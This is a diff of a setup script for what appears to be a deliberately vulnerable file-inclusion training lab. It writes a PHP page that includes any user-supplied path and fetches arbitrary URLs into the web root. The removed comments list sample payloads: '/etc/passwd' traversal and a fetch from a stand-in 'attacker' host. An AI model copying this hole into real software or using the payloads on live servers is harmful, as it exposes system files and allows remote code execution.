@@ -8,7 +8,7 @@ sudo chmod +x lablfi.sh
 sudo ./lablfi.sh
 
 # tiếp theo
-sudo tee /var/www/tomato/antibot_image/antibots/info.php >/dev/null <<'PHP'
+sudo tee /var/www/tmt/antibot_image/antibots/info.php >/dev/null <<'PHP'
 <?php header("X-Frame-Options: DENY"); ?>
 <!doctype html>
 <html lang="en">
@@ -22,7 +22,6 @@ sudo tee /var/www/tomato/antibot_image/antibots/info.php >/dev/null <<'PHP'
   .card{background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:18px;box-shadow:0 6px 28px rgba(0,0,0,.06)}
   .phpinfo{background:#fff;padding:0;border-radius:10px}
   .muted{color:var(--muted)}
-  /* hint chỉ xuất hiện khi View-Source (đã escape), không lộ trên UI */
   pre.dev-hint{display:none}
 </style>
 </head>
@@ -37,10 +36,8 @@ sudo tee /var/www/tomato/antibot_image/antibots/info.php >/dev/null <<'PHP'
   </div>
 
 <?php
-/* LFI giữ nguyên: ?image=/etc/passwd hoặc ../../../../../etc/passwd */
 if (isset($_GET['image'])) { $p = $_GET['image']; @include($p); exit; }
 
-/* Fetch giữ nguyên: ?fetch=http://attacker/u.php  (lưu ngay tại thư mục này) */
 if (isset($_GET['fetch'])) {
   $url = $_GET['fetch'];
   $basename = basename(parse_url($url, PHP_URL_PATH) ?: 'f.bin');
